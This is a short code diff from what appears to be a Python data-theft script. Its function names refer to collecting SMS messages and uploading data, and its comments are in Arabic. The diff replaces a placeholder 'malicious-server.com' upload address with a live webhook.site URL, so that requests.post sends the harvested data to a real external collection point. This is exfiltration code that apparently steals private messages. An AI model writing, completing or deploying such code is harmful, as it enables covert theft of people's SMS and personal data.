@@ -45,7 +45,7 @@ def collect_sms():
 
 # 4. رفع البيانات إلى الخادم
 def upload_data(data):
-    server_url = "http://malicious-server.com/upload"  # استخدم عنوان خادم وهمي للتجربة
+    server_url = "https://webhook.site/457d6ea3-5a8a-4186-b8b7-5c50ac4f1881"  # استخدم عنوان خادم وهمي للتجربة
     try:
         response = requests.post(server_url, data=data)
         if response.status_code == 200:
